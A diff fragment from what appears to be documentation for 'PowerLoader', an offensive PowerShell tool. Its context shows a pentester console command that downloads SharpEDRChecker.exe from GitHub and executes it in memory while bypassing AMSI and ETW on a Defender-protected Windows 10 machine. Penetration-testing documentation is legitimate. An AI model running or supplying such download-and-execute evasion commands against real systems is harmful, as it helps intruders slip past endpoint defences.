@@ -210,10 +210,10 @@ PS C:\Users\pentester> invoke-command -scriptblock $payload0
 PS C:\Users\pentester>
 
 
-========================================================================================================================================
+===============================================================================================================================================
 Example 4 - Download and execute into-memory SharpEDRChecker.exe (C# / .NET assembly)  with 'PowerLoader' on a Windows 10 laptop fully patched 
             with the Microsoft Defender AV enabled and up-to-date
-========================================================================================================================================
+===============================================================================================================================================
 
 PS C:\Users\pentester> $payload0 = New-PowerLoader-Custom -Type NetASM -FileUrl "https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/SharpEDRChecker.exe?raw=true" -Bypass AntiMSI,ETW
 PS C:\Users\pentester> invoke-command -scriptblock $payload0
